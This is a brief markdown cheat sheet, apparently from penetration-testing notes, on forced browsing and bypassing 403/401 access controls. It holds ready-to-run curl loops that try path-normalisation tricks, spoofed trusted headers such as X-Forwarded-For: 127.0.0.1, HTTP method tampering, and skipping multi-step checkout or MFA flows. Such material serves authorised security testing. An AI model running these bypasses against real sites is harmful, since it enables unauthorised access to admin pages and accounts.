# Forced browsing & 403 bypasses

**Signs**: admin/manager/internal pages exist (found via fuzzing, JS, nav menus) but aren't linked
for you, or return 403/401/302→login.

## 1. Just request it
Many apps only hide the *link*: `curl -s -b <your cookie> $T/admin`.

## 2. 403 bypass tricks (path normalisation mismatches)
```bash
for p in '/admin' '/admin/' '/Admin' '/ADMIN' '//admin' '/./admin' '/admin/.' '/admin..;/' \
         '/%2fadmin' '/admin%20' '/admin%09' '/admin.json' '/admin?' '/admin#' '/;/admin' '/admin;'; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' "$T$p") $p"; done
```
Headers: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Forwarded-For: 127.0.0.1`
→ [trusted-headers](../03-auth/trusted-headers.md).

## 3. Method tampering
```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo "$m $(curl -s -o /dev/null -w '%{http_code}' -X $m $T/admin)"; done
curl -s -X POST -H 'X-HTTP-Method-Override: GET' $T/admin
```

## 4. Skip steps
Multi-step flows (checkout, MFA, wizard): call the final step directly.

Script: `python scripts/recon/bypass_403.py $T/admin`
